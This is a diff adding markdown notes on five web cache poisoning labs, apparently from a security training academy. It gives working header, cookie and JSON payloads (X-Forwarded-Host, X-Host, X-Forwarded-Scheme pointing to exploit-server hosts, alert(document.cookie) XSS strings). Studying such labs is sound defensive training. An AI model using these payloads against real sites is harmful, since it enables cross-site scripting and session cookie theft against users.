@@ -1,0 +1,14 @@
+# Exploiting cache design flaws
+1. This lab has a basic cache poisoning attack where the unkeyed header `X-Forwarded-For` is used to dynamically generate a link to an external script. As such, by changing the exploit server's exploit page to be `/resources/js/tracking.js` and sending a request with the following header added, the cache can be poisoned to execute arbitrary javascript as is set in the exploit server: `X-Forwarded-Host: exploit-ac2e1fa71f190dabc0461bbf01f80054.web-security-academy.net`
+2. This lab has a bug where the `Cookie` header is unkeyed, and one of the cookies is reflected within a script block. As such, sending a request with the following cookie can be used to cause XSS via cache poisoning: `fehost="}-alert(document.cookie)-{"asdf":"`
+3. This lab has a bug where the request to `/resources/js/tracking.js` can be poisoned through a combination of the `X-Forwarded-Scheme` and `X-Forwarded-Host` headers. When the `X-Forwarded-Scheme` header is present and has a value of anything other than `https`, it returns a dynamically created redirection to the HTTPS version. It will use the `X-Forwarded-Host` value in this redirection, if it is present. As such, setting the exploit server to return `alert(document.cookie)` in response to `GET /resources/js/tracking.js` allows the following headers to poison the GET request and result in XSS:
+```
+X-Forwarded-Scheme: asdf
+X-Forwarded-Host: exploit-acc71f921e3efb2ec0ef0c52015b0021.web-security-academy.net
+```
+4. This lab has a cache poisoning attack like the first lab, but with the `X-Host` header instead. However, the `User-Agent` header is keyed as well. As such, the user agent of the target must be discovered. This can be done by posting a comment with an image pointing to the exploit server, where the user agent can be seen. As such, the same steps as lab 1 can be followed, but with the following headers set to poison the cache:
+```
+X-Host: exploit-aca81f841e4b792ec0feb4c70164001b.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
+```
+5. This lab has a cache poisoning attack where the `X-Forwarded-Host` header is used to generate a link to JSON data that is handled unsafely, resulting in a DOM-based XSS vulnerability. By setting the exploit server's endpoint to `/resources/json/geolocate.json`, adding the `Access-Control-Allow-Origin: *` header to disable CORS, and setting the content to `{"country": "<img src=x onerror=alert(document.cookie)"}`, the cache poisoning attack can be triggered by sending a request with the following header: `X-Forwarded-Host: exploit-acee1f8a1f8d8321c0789c210182007d.web-security-academy.net`. This lab does not allow caching of responses that contain the `Set-Cookie` header, so the attack has to be performed after receiving a session cookie.
